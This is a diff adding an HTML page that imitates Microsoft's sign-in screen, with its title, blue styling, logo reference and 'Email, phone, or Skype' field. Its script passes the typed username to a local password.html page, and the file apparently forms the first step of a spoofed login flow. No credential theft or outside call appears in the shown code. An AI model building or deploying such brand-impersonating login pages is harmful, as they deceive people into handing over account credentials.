@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Microsoft Sign in</title>
+<style>
+  :root { --ms-blue:#0067b8; --ms-blue-hover:#115ea3; --card-w:420px; --radius:4px; }
+
+
+  *, *::before, *::after { box-sizing: border-box; }
+
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family: "Segoe UI Web (West European)", "Segoe UI",
+                 system-ui, -apple-system, BlinkMacSystemFont,
+                 Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: radial-gradient(1000px 600px at 10% 10%, #f3f6fb 0%, #e9eff8 45%, #e6edf6 60%, #e9eff8 100%);
+    display:grid;place-items:center;
+
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+
+  input, button, select, textarea { font: inherit; }
+
+
+  .shell {
+    width: var(--card-w);
+    margin: 0 auto;
+  }
+
+  .card,
+  .options { width: 100%; }
+
+  .card{
+    background:#fff;border-radius:var(--radius);
+    box-shadow:0 2px 14px rgba(0,0,0,.12);
+    padding:28px 28px 24px;
+  }
+
+ 
+
+  h1{font-size:28px;font-weight:400;margin:6px 0 14px;color:#000}
+
+  .textbox{margin:0 0 4px}
+  .textbox input{
+    width:100%;font-size:16px;padding:10px 2px 8px;
+    border:none;border-bottom:1px solid #adadad;outline:none;background:transparent
+  }
+  .textbox input:focus{border-bottom:2px solid var(--ms-blue)}
+
+  .links{margin:14px 0 18px;font-size:13px}
+  .links a{color:var(--ms-blue);text-decoration:none}
+  .links a:hover{text-decoration:underline}
+
+  .actions{display:flex;justify-content:flex-end;margin-top:8px}
+  .btn{
+    border:none;border-radius:2px;background:var(--ms-blue);color:#fff;
+    padding:8px 18px;font-size:14px;cursor:pointer;min-width:96px;height:32px
+  }
+  .btn:hover{background:var(--ms-blue-hover)}
+
+  .options{
+    margin-top:12px;background:#fff;border-radius:var(--radius);
+    box-shadow:0 2px 14px rgba(0,0,0,.08);
+    padding:12px 16px;display:flex;align-items:center;gap:10px
+  }
+  .options svg{width:18px;height:18px;flex:0 0 auto}
+  .options a{color:#000;text-decoration:none;font-size:14px}
+  .options a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+  <div class="shell">
+    <div class="card">
+      <img id="bannerLogo"
+           src="microsoft.svg"
+           alt="Organization banner logo"
+           class="banner-logo">
+      <h1>Sign in</h1>
+
+      <div class="textbox">
+        <input id="iUsername" type="text" inputmode="email"
+               placeholder="Email, phone, or Skype" autocomplete="username" />
+      </div>
+
+      <div class="links">
+        <a href="#">No account? Create one!</a><br />
+        <a href="#">Can't access your account?</a>
+      </div>
+
+      <div class="actions">
+        <button class="btn" type="button" onclick="goNext()">Next</button>
+      </div>
+    </div>
+
+    <div class="options">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M10.5 3a7.5 7.5 0 015.95 12.13l4.21 4.21-1.41 1.41-4.21-4.21A7.5 7.5 0 1110.5 3zm0 2a5.5 5.5 0 100 11 5.5 5.5 0 000-11z" fill="currentColor"/>
+      </svg>
+      <a href="#" role="button">Sign-in options</a>
+    </div>
+  </div>
+
+<script>
+  function goNext(){
+    const v = document.getElementById('iUsername').value.trim();
+    if(!v){ alert('Please enter your email, phone, or Skype.'); return; }
+    const url = new URL('password.html', location.href);
+    url.searchParams.set('user', v);
+    location.href = url.toString();
+  }
+</script>
+</body>
+</html>
